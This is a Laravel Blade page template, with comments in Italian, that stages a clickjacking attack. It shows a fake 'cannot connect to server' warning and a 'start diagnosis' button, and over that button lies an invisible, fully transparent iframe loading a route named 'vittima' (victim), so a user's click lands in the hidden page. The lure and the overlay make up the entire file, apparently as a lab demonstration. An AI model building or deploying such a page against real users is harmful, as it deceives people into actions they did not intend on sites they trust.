<x-layout>
  <div class="container-fluid py-5 bg-body-secondary text-center">
    <h1 class="display-1 mb-4">Impostazione rete, connessione, internet</h1>

    <div class="card shadow mx-auto" style="max-width: 600px;">
      <div class="card-body p-4">
        <h4 class="fw-bold text-danger mb-3">
          <span class="me-2">⚠️</span>Impossibile connettersi al server
        </h4>
        <p class="text-muted mb-4">Clicca il bottone sottostante per eseguere una diagnosi e risolvere.</p>

        <!-- wrapper che prende la dimensione del bottone -->
        <div class="position-relative d-inline-block"
             style="width:220px; height:56px;">
          <!-- Bottone visibile: stesse dimensioni del wrapper -->
          <button class="btn btn-danger btn-lg w-100 h-100 fw-bold"
                  style="line-height:1.2;">
            Avvia diagnosi
          </button>

          <!-- IFRAME invisibile -->
          <iframe
            src="{{ route('vittima') }}"
            title="victim"
            style="
              position:absolute; inset:0;
              width:100%; height:100%;
              border:0; opacity:0; z-index:1050; pointer-events:auto;
            ">
          </iframe>
        </div>
      </div>
    </div>
  </div>
</x-layout>
